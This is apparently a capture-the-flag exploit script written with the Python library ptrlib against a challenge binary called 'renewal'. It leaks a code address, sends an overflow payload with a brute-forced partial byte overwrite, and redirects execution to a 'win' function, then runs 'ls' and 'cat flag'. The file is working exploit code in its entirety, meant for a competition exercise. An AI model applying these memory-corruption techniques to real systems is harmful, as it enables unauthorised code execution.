from ptrlib import *

elf = ELF("../dist/renewal")
libc = ELF('../dist/libc-2.31.so')

while(1):
    try:
        io = Process("../dist/renewal")
        #io = Socket("localhost", 30017)

        #input()
        io.sendlineafter("Name > ", "N")
        io.sendlineafter("Words > ", "W")
        io.sendlineafter("Age > ", "256")
        io.sendlineafter("Job > ", "J" * (0x10 - 3) + "END")
        io.recvuntil("END")
        text_addr = io.recvline()
        text_addr = u64(text_addr)
        elf.base = text_addr - 0x12b9

        io.sendlineafter("> ", "4")

        # 1/16
        one_byte = 0x40
        payload = b"C" * 0x18
        payload += p32(0x4)
        payload += p32(0xffffffff)
        payload += p8(one_byte)
        io.sendlineafter("> ", payload)

        win_addr = elf.symbol('win')
        io.sendlineafter("> ", "4")
        io.sendlineafter("> ", p64(win_addr + 5))
        io.sendlineafter("?\n", "YES")
        io.sendlineafter("!\n", "ls")
        io.sendlineafter("flag", "cat flag", timeout=0.1)
        break
    except TimeoutError as e:
        print(e)

io.interactive()
